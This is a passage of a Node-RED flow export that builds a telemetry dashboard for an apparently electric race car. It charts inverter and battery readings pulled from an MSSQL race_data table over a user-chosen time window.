        "x": 1050,
        "y": 420,
        "wires": [
            [
                "e12348898725e889"
            ]
        ]
    },
    {
        "id": "5e1e1ac619816c05",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_angle_electrical);\n\nmsg.payload = [\n    {\n        \"series\": [\"Motor Angle Electrical\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 480,
        "wires": [
            [
                "26803a8b2ad138aa"
            ]
        ]
    },
    {
        "id": "7346961e9bc86d1b",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_temperature);\nlet series2 = msg.payload.map(item => item.inv_hot_spot_temperature);\nlet series3 = msg.payload.map(item => item.inv_coolant_temperature);\n\nmsg.payload = [\n    {\n        \"series\": [\"Motor Temperature\", \"Hot Spot Temperature\", \"Coolant Temperature\"],\n        \"data\": [series1, series2, series3],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 520,
        "wires": [
            [
                "cee58944ef8ded67"
            ]
        ]
    },
    {
        "id": "629f06c4e2507c71",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_ref_voltage_12_0);\nlet series2 = msg.payload.map(item => item.inv_ref_voltage_5_0);\nlet series3 = msg.payload.map(item => item.inv_ref_voltage_2_5);\nlet series4 = msg.payload.map(item => item.inv_ref_voltage_1_5);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV REF Voltage 12.0\", \"INV REF Voltage 5.0\", \"INV REF Voltage 2.5\", \"INV REF Voltage 1.5\"],\n        \"data\": [series1, series2, series3, series4],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 60,
        "wires": [
            [
                "6606b0ddb159879f"
            ]
        ]
    },
    {
        "id": "d3b3112a27dec1a5",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_iq);\nlet series2 = msg.payload.map(item => item.inv_id);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Iq\", \"INV Id\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 100,
        "wires": [
            [
                "3bce2f5f5926f774"
            ]
        ]
    },
    {
        "id": "51528fa94f8bc774",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_vq_ff);\nlet series2 = msg.payload.map(item => item.inv_vd_ff);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Vq FF\", \"INV Vd FF\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 140,
        "wires": [
            [
                "2325192d4672564c"
            ]
        ]
    },
    {
        "id": "639f7b8a0640fe69",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_vbc_vq_voltage);\nlet series2 = msg.payload.map(item => item.inv_vab_vd_voltage);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Vbc-Vq Voltage\", \"INV Vab-Vd Voltage\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 180,
        "wires": [
            [
                "14aca8d8ad10e004"
            ]
        ]
    },
    {
        "id": "150676ae27de9713",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_rtd2_temperature);\nlet series2 = msg.payload.map(item => item.inv_rtd1_temperature);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV rtd2 temperature\", \"INV rtd1 temperature\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 560,
        "wires": [
            [
                "60546afd373bb3e0"
            ]
        ]
    },
    {
        "id": "d0954a33c4746f3c",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_control_board_temperature);\nlet series2 = msg.payload.map(item => item.inv_gate_driver_board_temperature);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Control Board Temperature\", \"INV Gate Driver Board Temperature\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 600,
        "wires": [
            [
                "a87287b63d7a56dc"
            ]
        ]
    },
    {
        "id": "259fc783c92c7936",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_module_c_temperature);\nlet series2 = msg.payload.map(item => item.inv_module_b_temperature);\nlet series3 = msg.payload.map(item => item.inv_module_a_temperature);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Module C Temperature\", \"INV Module B Temperature\", \"INV Module A Temperature\"],\n        \"data\": [series1, series2, series3],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 640,
        "wires": [
            [
                "f532b429468ce19f"
            ]
        ]
    },
    {
        "id": "b5b24d160b2a085e",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_diag_ia);\nlet series2 = msg.payload.map(item => item.inv_diag_ib);\nlet series3 = msg.payload.map(item => item.inv_diag_ic);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Diag Ia\", \"INV Diag Ib\", \"INV Diag Ic\"],\n        \"data\": [series1, series2, series3],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 700,
        "wires": [
            [
                "763a6ba5998417a2"
            ]
        ]
    },
    {
        "id": "3118857487301cfe",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_diag_iq_cmd);\nlet series2 = msg.payload.map(item => item.inv_diag_id_cmd);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Diag Iq CMD\", \"INV Diag Id CMD\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 740,
        "wires": [
            [
                "64212f27e7ed2872"
            ]
        ]
    },
    {
        "id": "7f504d5c515686cb",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_diag_vq_cmd);\nlet series2 = msg.payload.map(item => item.inv_diag_vd_cmd);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Diag Vq CMD\", \"INV Diag Vd CMD\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 820,
        "wires": [
            [
                "a239299933bef655"
            ]
        ]
    },
    {
        "id": "6ac0390839e64a7c",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_diag_pwm_freq);\n\nmsg.payload = [\n    {\n        \"series\": [\"PMW Freq\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 860,
        "wires": [
            [
                "5fd4ae9fbd270645"
            ]
        ]
    },
    {
        "id": "a57cf2d67b576307",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_fast_torque_command);\nlet series2 = msg.payload.map(item => item.inv_fast_torque_feedback);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Fast Torque Command\", \"INV Fast Torque Feedback\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 900,
        "wires": [
            [
                "73d0aa067a7b1026"
            ]
        ]
    },
    {
        "id": "6ee6fbe0faa559f8",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.bms_max_discharge_current);\nlet series2 = msg.payload.map(item => item.bms_max_charge_current);\n\nmsg.payload = [\n    {\n        \"series\": [\"BMS Max Discharge Current\", \"BMS Max Charge Current\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 940,
        "wires": [
            [
                "8d79420c84062d6b"
            ]
        ]
    },
    {
        "id": "0a1fc2c2e4cd54bd",
        "type": "MSSQL",
        "z": "58631339f9f9424f",
        "mssqlCN": "933ce03686fddbab",
        "name": "Past Data",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT *\nFROM dbo.race_data\nWHERE timestamp BETWEEN '{{payload.start_time}}' AND '{{payload.end_time}}'\nORDER BY timestamp",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "payload.selectedDateTime",
        "paramsOptType": "msg",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 740,
        "y": 300,
        "wires": [
            [
                "663eb6b854d714f7",
                "4a4dec27480cd101",
                "6dc372303b7d83fc",
                "0ff6fbc467e6461a",
                "b397c39e4e986dd7",
                "d42ca8871e523daf",
                "0dc1acdb8ad3b540"
            ]
        ]
    },
    {
        "id": "7746b790e296195c",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Convert Date & Time",
        "func": "// Extract date and time components from the incoming message\nvar start_time = msg.payload.starting_time; // Assuming date is provided by ui_date node\nvar duration = msg.payload.duration; // Assuming time is provided by ui_time node\n\nstart_time = start_time / 1000;     //Convert from milliseconds to seconds\nstart_time = start_time + 5*60*60;  //Convert to EST by adding 5 hours \n\nduration = duration * 60;    //Convert duration from minutes to seconds\n\nmsg.payload =\n{\n    start_time: start_time,\n    end_time : start_time + duration\n}\n\n// Pass the modified message to the next node in the flow\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 480,
        "y": 300,
        "wires": [
            [
                "09d043f40fc3f433",
                "0a1fc2c2e4cd54bd"
            ]
        ]
    },
    {
        "id": "09d043f40fc3f433",
        "type": "ui_text",
        "z": "58631339f9f9424f",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 3,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "payload",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 740,
        "y": 260,
        "wires": []
    },
    {
        "id": "49bd2ff51e72b80a",
        "type": "ui_text_input",
        "z": "58631339f9f9424f",
        "name": "",
        "label": "Starting Time",
        "tooltip": "",
        "group": "7f4edb2103a1ccbd",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "datetime-local",
        "delay": 300,
        "topic": "starting_time",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 80,
        "y": 280,
        "wires": [
            [
                "b920e62e40b903ed",
                "59f2f65e118fda63"
            ]
        ]
    },
    {
        "id": "9a7d94a6702275a2",
        "type": "ui_slider",
        "z": "58631339f9f9424f",
        "name": "",
        "label": "Duration (Minutes)",
        "tooltip": "",
        "group": "7f4edb2103a1ccbd",
        "order": 2,
        "width": 0,
        "height": 0,
        "passthru": true,
        "outs": "all",
        "topic": "duration",
        "topicType": "str",
        "min": 0,
        "max": "30",
        "step": 1,
        "className": "",
        "x": 90,
        "y": 320,
        "wires": [
            [
                "b920e62e40b903ed",
                "13a4fd260e3a4d4d"
            ]
        ]
    },
    {
        "id": "b920e62e40b903ed",
        "type": "join",
        "z": "58631339f9f9424f",
        "name": "",
        "mode": "custom",
        "build": "object",
        "property": "payload",
        "propertyType": "msg",
        "key": "topic",
        "joiner": "\\n",
        "joinerType": "str",
        "accumulate": true,
        "timeout": "",
        "count": "2",
        "reduceRight": false,
        "reduceExp": "",
        "reduceInit": "",
        "reduceInitType": "",
        "reduceFixup": "",
        "x": 270,
        "y": 300,
        "wires": [
            [
                "7746b790e296195c",
                "afba2c6cdbc0d02d"
            ]
        ]
    },
    {
        "id": "59f2f65e118fda63",
        "type": "ui_text",
        "z": "58631339f9f9424f",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Start",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 210,
        "y": 220,
        "wires": []
    },
    {
        "id": "13a4fd260e3a4d4d",
        "type": "ui_text",
        "z": "58631339f9f9424f",
        "group": "7f4edb2103a1ccbd",
        "order": 3,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Duration",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 240,
        "y": 380,
        "wires": []
    },
    {
        "id": "afba2c6cdbc0d02d",
        "type": "ui_text",
        "z": "58631339f9f9424f",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 5,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Func Input",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 430,
        "y": 340,
        "wires": []
    },
    {
        "id": "f83a4a84d1128840",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 5,
        "width": "10",
        "height": "6",
        "label": "Pack Current",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1310,
        "y": 200,
        "wires": [
            []
        ]
    },
    {
        "id": "89826c7c6d25c159",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 4,
        "width": "10",
        "height": "6",
        "label": "Pack Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1310,
        "y": 240,
        "wires": [
            []
        ]
    },
    {
        "id": "7a509816db6a57ee",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 6,
        "width": "10",
        "height": "6",
        "label": "Average Pack Current",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1340,
        "y": 280,
        "wires": [
            []
        ]
    },
    {
        "id": "295056051f9b2e17",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Highest/Average Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#6dc700",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 320,
        "wires": [
            []
        ]
    },
    {
        "id": "ac0e2c252c97a26b",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 8,
        "width": "10",
        "height": "6",
        "label": "Low Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1330,
        "y": 360,
        "wires": [
            []
        ]
    },
    {
        "id": "4e5130e42e135b99",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 9,
        "width": "10",
        "height": "6",
        "label": "Average Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1340,
        "y": 400,
        "wires": [
            []
        ]
    },
    {
        "id": "a2624f1a1d68ffd6",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 10,
        "width": "10",
        "height": "6",
        "label": "High Cell Internal Resistance",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1360,
        "y": 440,
        "wires": [
            []
        ]
    },
    {
        "id": "663eb6b854d714f7",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.pack_current);\n\nmsg.payload = [\n    {\n        \"series\": [\"Pack Current\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 200,
        "wires": [
            [
                "f83a4a84d1128840"
            ]
        ]
    },
    {
        "id": "4a4dec27480cd101",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.pack_inst_voltage);\n\nmsg.payload = [\n    {\n        \"series\": [\"Pack Instant Voltage\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 240,
        "wires": [
            [
                "89826c7c6d25c159"
            ]
        ]
    },
    {
        "id": "6dc372303b7d83fc",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.average_current);\n\nmsg.payload = [\n    {\n        \"series\": [\"Average Current\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 280,
        "wires": [
            [
                "7a509816db6a57ee"
            ]
        ]
    },
    {
        "id": "0ff6fbc467e6461a",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.high_temperature);\nlet series2 = msg.payload.map(item => item.average_temperature);\n\nmsg.payload = [\n    {\n        \"series\": [\"High Temperature\", \"Average Temperature\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 320,
        "wires": [
            [
                "295056051f9b2e17"
            ]
        ]
    },
    {
        "id": "b397c39e4e986dd7",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.low_cell_voltage);\n\nmsg.payload = [\n    {\n        \"series\": [\"Low Cell Voltage\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 360,
        "wires": [
            [
                "ac0e2c252c97a26b"
            ]
        ]
    },
    {
        "id": "d42ca8871e523daf",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.average_cell_voltage);\n\nmsg.payload = [\n    {\n        \"series\": [\"Average Cell Voltage\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 400,
        "wires": [
            [
                "4e5130e42e135b99"
            ]
        ]
    },
    {
        "id": "0dc1acdb8ad3b540",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.high_cell_resistance);\n\nmsg.payload = [\n    {\n        \"series\": [\"High Cell Resistance\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 440,
        "wires": [
            [
                "a2624f1a1d68ffd6"
            ]
        ]
    }
]